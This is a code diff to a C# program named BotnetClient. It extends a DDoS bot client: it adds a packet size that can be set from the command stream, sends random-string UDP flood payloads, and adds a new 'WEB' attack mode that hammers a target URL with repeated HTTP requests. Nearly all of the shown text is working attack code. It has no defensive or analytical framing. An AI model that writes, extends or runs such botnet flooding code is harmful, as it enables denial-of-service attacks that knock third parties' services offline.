@@ -34,6 +34,7 @@ namespace BotnetClient
         static bool restart = false; // If this gets set to true, the client will restart & reconnect
         static int Delay = 15000; // Delay
         static int SockCount = 8; // How many connections to make?
+        static int packetSize = 32; // size of packets being sent during attack
         Boolean attacking = false; // Are we currently attacking?
         // Other Variables
         static Random Rand = new Random(); // Random number generator
@@ -165,6 +166,10 @@ namespace BotnetClient
                                             {
                                                 SockCount = int.Parse(item.Substring(item.IndexOf(":") + 1));
                                             }
+                                            else if (item.Contains("Packet Size:"))
+                                            {
+                                                packetSize = int.Parse(item.Substring(item.IndexOf(":") + 1));
+                                            }
                                             else if (item.Contains("Type:"))
                                             {
                                                 type = item.Substring(item.IndexOf(":") + 1).Trim();
@@ -181,12 +186,12 @@ namespace BotnetClient
                                                         try
                                                         {
                                                             AttackConnection newConnection = new AttackConnection();
-                                                            log("Creating attack thread [" + newConnection.guid + "]");
+                                                            log("Starting attack thread " + newConnection.guid + "...");
                                                             newConnection.attackThread = new Thread(() => attackV2(newConnection));
                                                             newConnection.attackThread.Start();
                                                         } catch (Exception e)
                                                         {
-                                                            log("Error creating attack thread " + e.ToString());
+                                                            log("Error starting attack thread " + e.ToString());
                                                         }
                                                         //try { InitClient(new TcpClient()); } catch { } // DISABLED FOR TESTING/CREATING V2
                                                     }
@@ -336,6 +341,7 @@ namespace BotnetClient
                     TcpClient client = new TcpClient(HostOrIP.Trim(), Port);
                     // Get a client stream for reading and writing.
                     NetworkStream stream = client.GetStream();
+                    log("[" + connection.guid + "] Starting TCP attack...");
                     while (shouldAttack)
                     {
                         shouldAttack = attacking;
@@ -343,12 +349,11 @@ namespace BotnetClient
                         Byte[] data = Encoding.ASCII.GetBytes(message);
                         try
                         {
-                            log("[" + connection.guid + "] sending " + type + " data: " + message);
                             stream.Write(data, 0, data.Length);
                         }
                         catch (Exception e)
                         {
-                            log("Problem sending " + type + " packet on thread " + connection.guid + ". Closing thread...");
+                            log("Problem sending packet on thread " + connection.guid + "... closing...");
                             stream.Close();
                             client.Close();
                             client.Dispose();
@@ -356,22 +361,24 @@ namespace BotnetClient
                         }
                         Thread.Sleep(Delay);
                     }
-                } catch (Exception e)
+                }
+                catch (Exception e)
                 {
                     log("Error perfomring " + type + " attack... " + e.ToString());
                 }
-                 
-            } else if (type == "UDP")
+
+            }
+            else if (type == "UDP")
             {
                 UdpClient client = new UdpClient(HostOrIP.Trim(), Port);
+                log("[" + connection.guid + "] Starting UDP attack...");
                 while (shouldAttack)
                 {
                     shouldAttack = attacking;
-                    string message = Guid.NewGuid().ToString();
+                    string message = RandomString(packetSize);
                     Byte[] sendBytes = Encoding.ASCII.GetBytes(message);
                     try
                     {
-                        log("[" + connection.guid + "] sending " + type + " data: " + message);
                         client.Send(sendBytes, sendBytes.Length);
                     }
                     catch (Exception e)
@@ -383,7 +390,24 @@ namespace BotnetClient
                     }
                     Thread.Sleep(Delay);
                 }
-            } else
+            }
+            else if (type == "WEB")
+            {
+                WebClient client = new WebClient();
+                log("[" + connection.guid + "] Starting WEB attack...");
+                while (shouldAttack)
+                {
+                    try
+                    {
+                        client.DownloadString(HostOrIP);
+                    } catch (Exception e)
+                    {
+
+                    }
+                    Thread.Sleep(Delay);
+                }
+            }
+            else
             {
                 log("Attack type could not be determined... (type = '" + type + "'");
             }
@@ -418,6 +442,13 @@ namespace BotnetClient
             {
                 MessageBox.Show(logListView.SelectedItems[0].Text, "Log Message");
             }
+        }
+        // Random string generator
+        public static string RandomString(int length)
+        {
+            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            return new string(Enumerable.Repeat(chars, length)
+              .Select(s => s[Rand.Next(s.Length)]).ToArray());
         }
     }
 }
